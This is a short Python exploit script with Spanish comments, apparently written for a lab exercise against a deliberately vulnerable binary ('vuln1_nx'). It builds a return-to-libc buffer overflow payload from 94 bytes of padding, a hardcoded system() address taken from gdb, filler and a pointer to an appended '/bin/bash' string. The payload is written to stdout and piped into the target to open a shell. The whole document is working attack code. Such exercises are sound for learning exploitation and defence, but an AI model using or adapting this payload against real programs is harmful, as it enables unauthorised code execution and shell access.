# !/usr/bin/env python3
import struct
import sys

offset = 94
# (gdb) p system
system_addr = 0xf7dba220
# ltrace ./vuln1 -> 0xffffcf1e  
# + 94 bytes de offset 
# + 4 bytes de system 
# + 4 bytes de JUNK 
# + 4 bytes de direccion base
base_addr = 0xffffcefe + offset + 12
bash_cmd = b"/bin/bash\x00"

payload = b"A" * offset
payload += struct.pack ( "<I" , system_addr )
payload += b"JUNK" # Relleno
payload += struct.pack ( "<I" , base_addr )
payload += bash_cmd

# (python3 ./exploit.py; cat) | ./vuln1_nx
sys.stdout.buffer.write (payload)
